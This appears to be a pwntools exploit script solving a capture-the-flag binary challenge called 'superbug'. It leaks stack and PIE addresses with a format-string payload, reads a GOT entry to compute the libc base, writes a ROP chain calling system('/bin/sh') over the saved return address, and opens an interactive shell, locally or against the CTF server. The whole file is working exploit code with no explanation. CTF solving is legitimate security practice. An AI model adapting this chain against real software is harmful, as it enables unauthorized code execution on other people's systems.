#!/usr/bin/env python2

import sys,os
from pwn import *

context.update(arch="amd64", endian="little", os="linux", )

LOCAL = True
HOST="pwn.game.alcapwnctf.in"
PORT=26337

TARGET=os.path.realpath("superbug")
LIBRARY="libc.so.6"

# e = ELF(TARGET, False)
libc = ELF(LIBRARY, False)

def exploit(r):

    r.sendlineafter(">> ","%9$p.%10$p")
    leak = r.recvline().strip().split()[4].split(".")
    rip=int(leak[0][2:],16)-0x8
    pie=int(leak[1][2:],16)-0x940
    rbp=rip-0x8
    log.info("Pie base at {}".format(hex(pie)))
    log.info("Saved RIP at {}".format(hex(rip)))
    log.info("Saved RBP at {}".format(hex(rbp)))
    r.sendlineafter("Choice >> ","1")
    r.sendlineafter("address >> ",hex(pie+0x202018))
    putsaddr = u64(r.recv(8))
    libcbase=putsaddr-0x875a0
    log.success("libcbase at {}".format(hex(libcbase)))

    POP_RDI = pie + 0x0000000000000d93
    binsh = libcbase + next(libc.search('/bin/sh\x00'))
    RET = pie + 0x0000000000000869
    system = libcbase + libc.symbols['system']

    for addr in [POP_RDI, binsh, RET, system]:
        r.sendlineafter("Choice >> ","2")
        r.sendlineafter("address >> ",hex(rip))
        r.send(p64(addr))
        rip+=8
    
    r.sendlineafter("Choice >> ","3")
    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process([TARGET,])#,env={'LD_PRELOAD':LIBRARY}) #remove the ')#'
        pause()

    exploit(r)

    sys.exit(0)
